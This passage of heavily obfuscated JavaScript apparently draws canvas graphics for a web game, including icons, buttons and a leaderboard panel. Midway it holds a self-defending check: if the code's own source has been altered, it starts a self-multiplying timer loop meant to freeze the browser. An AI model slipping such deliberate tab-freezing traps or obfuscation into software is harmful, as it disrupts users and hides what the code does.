			Δ.bezierCurveTo(80 * ᐃ, 35.5 * ᐃ, 80 * ᐃ, ᐃ * 35.5, ᐃ * 90, ᐃ * 30);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[ᐃⲆᐃⲆⵠ], ᐃ * ᐃⵠΔⵠⲆⲆⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(28 * ᐃ, 33 * ᐃ);
			Δ.bezierCurveTo(21.5 * ᐃ, ᐃ * 26.5, 21.5 * ᐃ, 26.5 * ᐃ, ᐃ * 15, ⲆⲆⲆⵠΔ * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, ⲆΔᐃᐃᐃ, Ⲇᐃ[ᐃⵠⵠΔ], ᐃ * 6);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 51, 28 * ᐃ);
			Δ.bezierCurveTo(53 * ᐃ, ᐃ * ΔΔΔⲆⲆⲆᐃ, 53 * ᐃ, ⲆⲆⲆⵠⲆ * ᐃ, 55 * ᐃ, ⲆΔᐃⵠⵠᐃⵠ * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, ⵠᐃⵠⲆΔ, Ⲇᐃ[4], ᐃ * 6);
			return Ⲇⵠ
		}

		function ⵠᐃⵠΔⲆΔⲆ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ, ⵠᐃⲆ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 501 * ᐃ;
			Ⲇⵠ.height = ᐃ * 564;
			Δ.scale(.5, .5);
			Δ.translate(240 * ᐃ, ᐃ * 255);
			Δ.rotate(ⵠᐃⲆ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : .2;
			ⵠᐃᐃ(Δ, 174 * ᐃ, 87.984375 * ᐃ, ᐃ * 20.8806130178211);
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[ᐃⵠΔ], ᐃ * 8);
			ⵠᐃᐃ(Δ, 174 * ᐃ, ᐃ * 87.984375, 12.165525060596439 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ⲆⲆⲆᐃ], Ⲇᐃ[0], ᐃⵠᐃᐃⵠ * ᐃ);
			ⵠᐃᐃ(Δ, 174 * ᐃ, 87.484375 * ᐃ, ⵠᐃΔⵠᐃ * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[0]);
			ⵠᐃᐃ(Δ, ᐃ * 30, 87.984375 * ᐃ, 20.8806130178211 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[Δᐃᐃⵠ], Ⲇᐃ[ⵠⲆⲆ], ⵠᐃᐃⲆ * ᐃ);
			ⵠᐃᐃ(Δ, ᐃ * 30, 87.984375 * ᐃ, 12.165525060596439 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[0], ᐃ * ⲆⵠΔⵠ);
			ⵠᐃᐃ(Δ, 30 * ᐃ, 87.484375 * ᐃ, 6 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔⲆⵠ]);
			ⵠᐃᐃ(Δ, 100 * ᐃ, ᐃ * 30, 20.8806130178211 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⵠⲆ], Ⲇᐃ[Ⲇᐃᐃᐃ], ᐃ * Ⲇᐃⵠᐃ);
			ⵠᐃᐃ(Δ, 100 * ᐃ, 30 * ᐃ, 12.165525060596439 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[Δᐃᐃⵠ], 4 * ᐃ);
			ⵠᐃᐃ(Δ, ᐃ * 100, ᐃ * 30, ᐃ * ᐃⲆⲆⲆ);
			ΔⲆ(Δ, Ⲇᐃ[0]);
			ⵠᐃᐃ(Δ, 100 * ᐃ, 130 * ᐃ, 20.8806130178211 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[ᐃΔΔ], 4 * ᐃ);
			ⵠᐃᐃ(Δ, ᐃ * ᐃΔⲆⲆᐃ, ᐃ * 130, ᐃ * 12.165525060596439);
			ΔⲆ(Δ, Ⲇᐃ[Δᐃᐃⵠ], Ⲇᐃ[0], ⵠΔΔᐃΔ * ᐃ);
			ⵠᐃᐃ(Δ, ᐃ * 100, ᐃ * 130, ᐃ * 6);
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⲆ]);
			Δ.save();
			Δ.translate(102 * ᐃ, ᐃ * 81.984375);
			Δ.rotate(Ⲇᐃᐃᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -74, -57 * ᐃ, ᐃ * 148, ᐃ * 114, ᐃ * 23);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[ⵠⲆᐃⵠ], ᐃ * ⲆΔⵠᐃ);
			Δ.save();
			Δ.translate(101 * ᐃ, 64.984375 * ᐃ);
			Δ.rotate(0);
			Ⲇᐃᐃ(Δ, -33 * ᐃ, -ⲆΔΔᐃᐃ * ᐃ, ᐃ * 66, 20 * ᐃ, 15 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[Δᐃᐃᐃ], ᐃ * 4);
			Δ.save();
			Δ.translate(102 * ᐃ, 63.484375 * ᐃ);
			Δ.rotate(ⵠⲆⲆ);
			Ⲇᐃᐃ(Δ, ᐃ * -ᐃΔᐃᐃΔⲆⵠ, ᐃ * -27.5, 18 * ᐃ, ᐃ * 55, ᐃ * ΔⲆᐃᐃΔΔᐃ);
			Δ.restore();
			Δ.translate(5, -5);
			Δ.globalAlpha = 1;
			ⵠᐃᐃ(Δ, ᐃ * 174, 87.984375 * ᐃ, 20.8806130178211 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[3], 8 * ᐃ);
			ⵠᐃᐃ(Δ, 174 * ᐃ, ᐃ * 87.984375, 12.165525060596439 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⵠ], Ⲇᐃ[ᐃⲆΔⵠ], ᐃ * 8);
			ⵠᐃᐃ(Δ, 174 * ᐃ, ᐃ * 87.484375, ᐃⵠⲆⵠΔ * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆΔⲆ]);
			ⵠᐃᐃ(Δ, ᐃ * 30, 87.984375 * ᐃ, 20.8806130178211 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃⵠΔ], Ⲇᐃ[3], ᐃ * 8);
			ⵠᐃᐃ(Δ, ᐃ * 30, 87.984375 * ᐃ, ᐃ * 12.165525060596439);
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[3], 8 * ᐃ);
			ⵠᐃᐃ(Δ, 30 * ᐃ, 87.484375 * ᐃ, ⵠΔⵠᐃⵠ * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ⵠⵠΔⲆ]);
			ⵠᐃᐃ(Δ, 102 * ᐃ, 30 * ᐃ, 20.8806130178211 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔⵠΔ], Ⲇᐃ[ⵠⲆΔⵠΔ], ⲆⲆᐃᐃⲆ * ᐃ);
			ⵠᐃᐃ(Δ, 102 * ᐃ, 30 * ᐃ, 12.165525060596439 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ΔΔΔ], Ⲇᐃ[Δⵠᐃⵠ], ⵠⵠᐃΔⲆ * ᐃ);
			ⵠᐃᐃ(Δ, 102 * ᐃ, 30 * ᐃ, ᐃ * ⵠᐃΔⵠⲆ);
			ΔⲆ(Δ, Ⲇᐃ[ΔᐃᐃⲆ]);
			ⵠᐃᐃ(Δ, 102 * ᐃ, ᐃ * 130, 20.8806130178211 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[3], ⵠᐃΔⵠΔΔⵠ * ᐃ);
			ⵠᐃᐃ(Δ, 102 * ᐃ, 130 * ᐃ, ᐃ * 12.165525060596439);
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[3], ΔᐃΔⲆⲆ * ᐃ);
			ⵠᐃᐃ(Δ, 102 * ᐃ, 130 * ᐃ, ᐃ * 6);
			ΔⲆ(Δ, Ⲇᐃ[1]);
			Δ.save();
			Δ.translate(ᐃ * 102, 81.984375 * ᐃ);
			Ⲇᐃᐃ(Δ, -74 * ᐃ, -57 * ᐃ, 148 * ᐃ, 114 * ᐃ, ᐃ * 23);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[3], ᐃ * 8);
			Δ.save();
			Δ.translate(ᐃ * 101, 64.984375 * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -33, ᐃ * -10, ᐃ * 66, ᐃᐃⵠⵠⲆ * ᐃ, ᐃ * ᐃᐃⵠΔⲆⵠᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[1], ⲆᐃΔⲆⵠ * ᐃ);
			Δ.save();
			Δ.translate(102 * ᐃ, ᐃ * 63.484375);
			Ⲇᐃᐃ(Δ, ᐃ * -9, -27.5 * ᐃ, ᐃ * ΔΔⲆⵠⵠᐃᐃ, ᐃ * 55, ᐃ * ᐃΔᐃΔᐃΔᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆⵠⲆ], Ⲇᐃ[ⵠΔⲆ], ᐃ * 8);
			ⵠᐃᐃ(Δ, ᐃ * 135, ᐃ * 107.36605834960938, 21.095023109728988 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[3], ΔᐃᐃⲆᐃ * ᐃ);
			ⵠᐃᐃ(Δ, ᐃ * 135, 107.36605834960938 * ᐃ, ᐃ * ⲆⲆΔⵠᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔᐃ], Ⲇᐃ[ΔᐃⲆΔ], 8 * ᐃ);
			ⵠᐃᐃ(Δ, ᐃ * 135, 107.36605834960938 * ᐃ, ᐃ * 6.082762530298219);
			ΔⲆ(Δ, Ⲇᐃ[ⲆΔΔⵠ]);
			ⵠᐃᐃ(Δ, ᐃ * 70, 107.36605834960938 * ᐃ, 21.095023109728988 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ΔΔᐃⵠ], Ⲇᐃ[3], ᐃ * ⵠⵠᐃΔⲆ);
			ⵠᐃᐃ(Δ, ᐃ * 70, ᐃ * 107.36605834960938, ᐃ * ⲆⵠΔⵠΔΔΔ);
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[3], ⵠⵠⵠΔᐃ * ᐃ);
			ⵠᐃᐃ(Δ, ᐃ * 70, ᐃ * 107.36605834960938, 6.082762530298219 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆⵠᐃΔ]);
			return Ⲇⵠ
		}
		const ᐃⵠⲆⵠ = ΔᐃΔΔ;

		function ᐃⲆᐃⵠΔⵠΔ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			var ᐃⵠⵠ = 120 * ᐃ;
			var ⵠⵠᐃ = ᐃ * 140;
			Ⲇⵠ.width = ᐃⵠⵠ;
			Ⲇⵠ.height = ⵠⵠᐃ;
			Ⲇⵠ.width = ᐃ * 130;
			Ⲇⵠ.height = ᐃ * 120;
			Ⲇᐃᐃ(Δ, ᐃ * 10, ᐃ * ᐃⲆⵠᐃⵠ, ᐃ * 110, ᐃ * 90, ᐃ * 10);
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔⲆⵠ]);
			Ⲇᐃᐃ(Δ, ⲆⲆⲆΔᐃ * ᐃ, ᐃ * 5, 110 * ᐃ, ᐃ * 90, 10 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[Ⲇᐃᐃⵠ], ⵠΔᐃΔ * ᐃ);
			var ᐃⵠ = ⲆΔⲆΔ(-Math.PI / 5, ᐃⵠⲆᐃΔ(.5 * ᐃ, ΔᐃΔΔⵠ, [ⵠ[191], ⵠ[191], ⵠ[191], ⵠ[253], ⵠ[253], ⵠ[253], ⵠ[253]]));
			Δ.drawImage(ᐃⵠ, 12 * ᐃ, ᐃΔᐃΔᐃ * ᐃ);
			var ᐃⵠ = ⲆΔⲆΔ(Math.PI / Ⲇⵠⵠⵠ, ΔⵠᐃΔᐃ(.55 * ᐃ, true, [ⵠ[191], ⵠ[253], ⵠ[253], ⵠ[253], ⵠ[253]]));
			Δ.drawImage(ᐃⵠ, 36 * ᐃ, ᐃ * ᐃᐃΔⵠⵠⵠΔ);
			return Ⲇⵠ
		}
		const ⲆⵠⲆᐃⲆ = ⲆΔΔᐃᐃ;

		function ⵠᐃΔⲆᐃΔΔᐃⲆ(ᐃⵠᐃΔ, ᐃⵠⲆΔΔⲆΔᐃⲆ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			var ᐃⵠⵠ = ᐃⵠᐃΔ.w + ᐃⵠᐃΔ.ⲆⵠⲆᐃⵠ;
			var ⵠⵠᐃ = ᐃⵠᐃΔ.ⵠⵠᐃ + ᐃⵠᐃΔ.ⲆⵠⲆᐃⵠ;
			var ᐃⵠΔⲆ = ⵠⵠᐃ * .1;
			Ⲇⵠ.width = ᐃⵠⵠ;
			Ⲇⵠ.height = ⵠⵠᐃ + ᐃⵠΔⲆ;
			Δ.beginPath();
			Δ.translate(ᐃⵠⵠ / 2, ⵠⵠᐃ / ⵠⵠⵠΔ + ᐃⵠΔⲆ);
			Δ.globalAlpha = .5;
			Ⲇᐃᐃ(Δ, -ᐃⵠᐃΔ.w / ᐃⲆⵠᐃ, -ᐃⵠᐃΔ.ⵠⵠᐃ / 2, ᐃⵠᐃΔ.w, ᐃⵠᐃΔ.ⵠⵠᐃ, ᐃⵠᐃΔ.r);
			ΔⲆ(Δ, ⵠ[481], ⵠ[481], ᐃⵠᐃΔ.ⲆⵠⲆᐃⵠ);
			Δ.globalAlpha = Ⲇᐃⵠ;
			Δ.beginPath();
			if (!ᐃⵠⲆΔΔⲆΔᐃⲆ) Δ.translate(ⲆΔⵠ, -ᐃⵠΔⲆ);
			Ⲇᐃᐃ(Δ, -ᐃⵠᐃΔ.w / ΔⵠⵠΔ, -ᐃⵠᐃΔ.ⵠⵠᐃ / ⵠⵠΔⲆ, ᐃⵠᐃΔ.w, ᐃⵠᐃΔ.ⵠⵠᐃ, ᐃⵠᐃΔ.r);
			ΔⲆ(Δ, ᐃⵠᐃΔ.ΔᐃᐃⵠⲆⲆⵠ, ᐃⵠᐃΔ.ᐃⲆⵠⲆᐃᐃⵠⲆᐃ, ᐃⵠᐃΔ.ⲆⵠⲆᐃⵠ);
			Δ.beginPath();
			Δ.fillStyle = ᐃⵠᐃΔ.color;
			Δ.textBaseline = ⵠ[ᐃᐃⵠⲆᐃ], Δ.textAlign = "center", Δ.font = ᐃⵠᐃΔ.size + "px " + ᐃⵠᐃΔ.font;
			Δ.fillText(ᐃⵠᐃΔ.text, 0, ⵠᐃⲆᐃ);
			return Ⲇⵠ
		}

		function ΔᐃⲆᐃΔⲆΔ(ᐃ, Ⲇᐃ, ⵠᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 109 * ᐃ;
			Ⲇⵠ.height = ᐃ * 110;
			ⵠᐃᐃ(Δ, ᐃ * 54.5, 55 * ᐃ, ᐃ * 48.038209575038294);
			ΔⲆ(Δ, Ⲇᐃ[ⲆΔⵠ], Ⲇᐃ[ΔⲆⵠ], ᐃ * 8);
			if (ⵠᐃ == ⵠⲆᐃⵠ) {
				Δ.beginPath();
				Δ.lineCap = ⵠ[ΔⲆΔΔ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(54.928558349609375 * ᐃ, ᐃ * 43.72320556640625);
				Δ.bezierCurveTo(66.92855834960938 * ᐃ, ᐃ * 31.72320556640625, ᐃ * 69.92855834960938, ᐃ * 29.72320556640625, ᐃ * 74.92855834960938, ᐃ * 29.72320556640625);
				Δ.bezierCurveTo(ᐃ * 86.92855834960938, 28.72320556640625 * ᐃ, 91.92855834960938 * ᐃ, 42.72320556640625 * ᐃ, 89.92855834960938 * ᐃ, 52.72320556640625 * ᐃ);
				Δ.bezierCurveTo(88.92855834960938 * ᐃ, ᐃ * 63.72320556640625, 73.92855834960938 * ᐃ, ᐃ * 75.72320556640625, 55.928558349609375 * ᐃ, 87.72320556640625 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 37.928558349609375, 78.72320556640625 * ᐃ, ᐃ * 26.928558349609375, 65.72320556640625 * ᐃ, 19.928558349609375 * ᐃ, ᐃ * 54.72320556640625);
				Δ.bezierCurveTo(13.928558349609375 * ᐃ, 42.72320556640625 * ᐃ, ᐃ * 21.928558349609375, 28.72320556640625 * ᐃ, ᐃ * 35.928558349609375, 29.72320556640625 * ᐃ);
				Δ.bezierCurveTo(45.928558349609375 * ᐃ, ᐃ * 31.72320556640625, 51.928558349609375 * ᐃ, ᐃ * 40.72320556640625, ᐃ * 53.928558349609375, ᐃ * 44.72320556640625);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[2])
			} else if (ⵠᐃ == ᐃΔᐃⲆ) {
				Δ.save();
				Δ.translate(55 * ᐃ, 39.48748779296875 * ᐃ);
				Ⲇᐃᐃ(Δ, ᐃ * -11.5, -36 * ᐃ, ᐃ * 23, 72 * ᐃ, ᐃ * 10);
				Δ.restore();
				ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[3], 4 * ᐃ);
				ⵠᐃᐃ(Δ, 54.5 * ᐃ, ᐃ * 78.48748779296875, 22.02271554554524 * ᐃ);
				ΔⲆ(Δ, Ⲇᐃ[ⵠΔΔᐃΔ], Ⲇᐃ[ΔΔⵠΔ], ᐃ * ᐃⵠⵠΔ);
				Δ.save();
				Δ.translate(55.5 * ᐃ, ᐃ * 57.287506103515625);
				Ⲇᐃᐃ(Δ, ᐃ * -ΔΔΔΔΔ, -16 * ᐃ, ᐃᐃᐃᐃⲆ * ᐃ, 32 * ᐃ, ᐃ * 10);
				Δ.restore();
				ΔⲆ(Δ, Ⲇᐃ[4]);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠᐃΔⵠ];
				Δ.lineJoin = ⵠ[ⵠᐃⲆΔ];
				Δ.moveTo(66.5 * ᐃ, ᐃ * 25.287506103515625);
				Δ.bezierCurveTo(ᐃ * 60.5, 25.287506103515625 * ᐃ, 63.5 * ᐃ, ᐃ * 25.287506103515625, 54.5 * ᐃ, 25.287506103515625 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, undefined, Ⲇᐃ[5], 4 * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(66.5 * ᐃ, 37.287506103515625 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 60.5, 37.287506103515625 * ᐃ, ᐃ * 60.5, ᐃ * 37.287506103515625, 54.5 * ᐃ, ᐃ * 37.287506103515625);
				Δ.closePath();
				ΔⲆ(Δ, undefined, Ⲇᐃ[ⵠⵠΔⵠ], ⲆΔⵠᐃ * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ᐃⲆⵠⵠ];
				Δ.moveTo(ᐃ * 66.5, ᐃ * 50.287506103515625);
				Δ.bezierCurveTo(61 * ᐃ, ᐃ * 50.287506103515625, 61 * ᐃ, 50.287506103515625 * ᐃ, ᐃ * 55.5, ᐃ * 50.287506103515625);
				Δ.closePath();
				ΔⲆ(Δ, undefined, Ⲇᐃ[5], ᐃ * 4)
			} else if (ⵠᐃ == ⵠⵠⵠΔ) {
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠᐃΔⲆ];
				Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
				Δ.moveTo(ᐃ * 45.928558349609375, ᐃ * 55.29463195800781);
				Δ.bezierCurveTo(ᐃ * 38.928558349609375, 67.29463195800781 * ᐃ, 38.928558349609375 * ᐃ, ᐃ * 67.29463195800781, ᐃ * 31.928558349609375, ᐃ * 79.29463195800781);
				Δ.bezierCurveTo(ᐃ * 15.928558349609375, 85.29463195800781 * ᐃ, 17.928558349609375 * ᐃ, 86.29463195800781 * ᐃ, 17.928558349609375 * ᐃ, ᐃ * 90.29463195800781);
				Δ.bezierCurveTo(19.928558349609375 * ᐃ, 94.29463195800781 * ᐃ, ᐃ * 21.928558349609375, 94.29463195800781 * ᐃ, 27.928558349609375 * ᐃ, ᐃ * 92.29463195800781);
				Δ.bezierCurveTo(29.928558349609375 * ᐃ, 98.29463195800781 * ᐃ, 30.928558349609375 * ᐃ, ᐃ * 99.29463195800781, 33.928558349609375 * ᐃ, ᐃ * 99.29463195800781);
				Δ.bezierCurveTo(ᐃ * 38.928558349609375, ᐃ * 97.29463195800781, ᐃ * 38.928558349609375, ᐃ * 93.29463195800781, ᐃ * 37.928558349609375, ᐃ * 86.29463195800781);
				Δ.bezierCurveTo(45.428558349609375 * ᐃ, ᐃ * 73.29463195800781, 51.928558349609375 * ᐃ, 64.29463195800781 * ᐃ, ᐃ * 52.928558349609375, 60.29463195800781 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ΔⲆΔΔΔ]);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠᐃΔⵠ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(55.928558349609375 * ᐃ, ᐃ * 8.866058349609375);
				Δ.bezierCurveTo(ᐃ * 35.928558349609375, ᐃ * 35.866058349609375, ᐃ * 37.928558349609375, ᐃ * 48.866058349609375, ᐃ * 46.928558349609375, ᐃ * 62.866058349609375);
				Δ.bezierCurveTo(65.92855834960938 * ᐃ, ᐃ * 72.86605834960938, 80.92855834960938 * ᐃ, 55.866058349609375 * ᐃ, ᐃ * 93.92855834960938, ᐃ * 36.866058349609375);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[ⲆᐃᐃΔ], ᐃ * ⲆᐃⲆΔΔ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠᐃΔⲆ];
				Δ.lineJoin = ⵠ[ⵠᐃⲆΔ];
				Δ.moveTo(ᐃ * 93.92855834960938, 36.866058349609375 * ᐃ);
				Δ.bezierCurveTo(82.92855834960938 * ᐃ, ᐃ * 37.866058349609375, 77.92855834960938 * ᐃ, ᐃ * 36.866058349609375, ᐃ * 67.92855834960938, 28.866058349609375 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 53.928558349609375, ᐃ * 16.866058349609375, 53.928558349609375 * ᐃ, 14.866058349609375 * ᐃ, 55.928558349609375 * ᐃ, 7.866058349609375 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 65.92855834960938, ᐃ * 4.866058349609375, ᐃ * 71.92855834960938, 7.866058349609375 * ᐃ, 83.92855834960938 * ᐃ, ᐃ * 13.866058349609375);
				Δ.bezierCurveTo(ᐃ * 96.92855834960938, ᐃ * 21.866058349609375, 95.92855834960938 * ᐃ, ᐃ * 31.866058349609375, ᐃ * 92.92855834960938, ᐃ * 36.866058349609375);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⲆΔᐃ], Ⲇᐃ[4], ᐃ * ⵠⵠⵠⲆⲆ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⲆΔⲆᐃ];
				Δ.lineJoin = ⵠ[ΔⲆΔΔ];
				Δ.moveTo(ᐃ * 68.92855834960938, ᐃ * 16.866058349609375);
				Δ.bezierCurveTo(ᐃ * 71.92855834960938, ᐃ * 13.866058349609375, 76.92855834960938 * ᐃ, 16.866058349609375 * ᐃ, 79.92855834960938 * ᐃ, 21.866058349609375 * ᐃ);
				Δ.bezierCurveTo(82.92855834960938 * ᐃ, 24.866058349609375 * ᐃ, 81.92855834960938 * ᐃ, ᐃ * 27.866058349609375, ᐃ * 73.92855834960938, ᐃ * 24.866058349609375);
				Δ.bezierCurveTo(67.92855834960938 * ᐃ, 20.866058349609375 * ᐃ, 66.92855834960938 * ᐃ, 19.866058349609375 * ᐃ, ᐃ * 67.92855834960938, 17.866058349609375 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[2])
			} else ⵠᐃ == 3 && (Δ.scale(.9, .9), Δ.translate(ᐃ * ⵠᐃΔⵠᐃ, ⵠⲆᐃⵠ), Δ.beginPath(), Δ.lineCap = ⵠ[5], Δ.lineJoin = ⵠ[ⲆⲆΔⵠ], Δ.moveTo(54 * ᐃ, ᐃ * .421875), Δ.bezierCurveTo(84 * ᐃ, 45.421875 * ᐃ, 89 * ᐃ, 51.421875 * ᐃ, ᐃ * 83, 74.421875 * ᐃ), Δ.bezierCurveTo(74 * ᐃ, ᐃ * 95.421875, ᐃ * 46, 98.421875 * ᐃ, 30 * ᐃ, 78.421875 * ᐃ), Δ.bezierCurveTo(ᐃ * 22, 59.421875 * ᐃ, ᐃ * 27, ᐃ * 49.421875, 34 * ᐃ, 36.421875 * ᐃ), Δ.closePath(), ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[3], Δⵠᐃᐃⵠ * ᐃ), Δ.beginPath(), Δ.lineCap = ⵠ[5], Δ.lineJoin = ⵠ[ᐃΔΔⲆ], Δ.moveTo(74 * ᐃ, 52.421875 * ᐃ), Δ.bezierCurveTo(ᐃ * 77, 73.421875 * ᐃ, 69 * ᐃ, 81.421875 * ᐃ, 58 * ᐃ, 81.421875 * ᐃ), Δ.bezierCurveTo(66 * ᐃ, ᐃ * 71.421875, 70 * ᐃ, ᐃ * 66.421875, ᐃ * 74, 52.421875 * ᐃ), Δ.closePath(), ΔⲆ(Δ, Ⲇᐃ[3]));
			return Ⲇⵠ
		}
		const ⵠⲆᐃᐃΔⵠⲆ = "";

		function ⲆⵠΔᐃⵠΔΔᐃⲆ(ⲆⵠⵠⵠᐃᐃΔ) {
			if (ⲆⵠⵠⵠᐃᐃΔ > 0) return ⲆⵠⵠⵠᐃᐃΔ * ⲆⵠⵠⵠᐃᐃΔ;
			else return ⲆⵠⵠⵠᐃᐃΔ
		}

		function ᐃⲆᐃᐃⲆΔⲆ(ᐃⲆΔᐃᐃᐃⵠ) {
			return ᐃⲆᐃΔᐃⵠᐃ.String.fromCharCode(ᐃⲆΔᐃᐃᐃⵠ)
		}

		function ᐃⵠᐃⲆᐃⵠᐃ(ᐃᐃⲆⵠΔ) {
			return ᐃᐃⲆⵠΔ.map(ᐃⲆᐃᐃⲆΔⲆ).join(ⵠⲆᐃᐃΔⵠⲆ)
		}

		function ΔΔΔⵠⲆ(ⵠΔⲆᐃⵠΔΔ) {
			const ⵠⲆⲆΔⲆᐃⵠ = ⲆⵠΔᐃⵠΔΔᐃⲆ[ΔᐃⲆⵠⲆⵠΔ[31]]();
			const ⵠΔᐃᐃᐃᐃⵠ = ⵠⲆⲆΔⲆᐃⵠ.indexOf(ⵠΔⲆᐃⵠΔΔ);
			return ⵠΔᐃᐃᐃᐃⵠ !== -1 ? 1 : 0
		}
		const ⲆΔᐃΔⵠΔΔ = ΔΔΔⵠⲆ(ᐃⵠᐃⲆᐃⵠᐃ([11398, 11616, 916, 5123, 11616, 916, 916, 5123, 11398]));
		if (ⲆΔᐃΔⵠΔΔ === 0) {
			const ⲆΔᐃΔⵠΔΔ = ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[275]];
			const ⵠΔᐃᐃᐃᐃⵠ = ⲆΔᐃΔⵠΔΔ;
			const ⲆⵠΔᐃⵠΔΔᐃⲆ = function() {
				ⲆΔᐃΔⵠΔΔ(ⲆⵠΔᐃⵠΔΔᐃⲆ, 8062);
				ⵠΔᐃᐃᐃᐃⵠ(ⲆⵠΔᐃⵠΔΔᐃⲆ, 6581)
			};
			ⲆⵠΔᐃⵠΔΔᐃⲆ()
		}

		function ᐃⵠᐃΔⵠⲆᐃⵠΔ(ᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			var ᐃⵠⵠ = ᐃ * 200;
			var ⵠⵠᐃ = ᐃ * 270;
			var ⲆⲆⵠ = ᐃ * Δᐃⵠⵠⵠ;
			Ⲇⵠ.width = ᐃⵠⵠ;
			Ⲇⵠ.height = ⵠⵠᐃ + ⵠᐃΔᐃᐃ;
			Δ.beginPath();
			Ⲇᐃᐃ(Δ, 0, ᐃⵠⲆⵠ, ᐃⵠⵠ, ⵠⵠᐃ - ⲆⲆⵠ, ⲆⲆⵠ);
			Δ.globalAlpha = .5;
			ΔⲆ(Δ, "#1D6055");
			Δ.globalAlpha = 1;
			var text = ᐃᐃΔΔᐃ(ᐃ, "Leaderboard", 25, ⵠ[253]);
			Δ.drawImage(text, (ᐃⵠⵠ - text.width) / 2, ⲆΔΔᐃ * ᐃ);
			return Ⲇⵠ
		}

		function ⵠⲆΔⲆⲆΔΔⵠⵠ(ᐃ, ⵠΔᐃΔΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
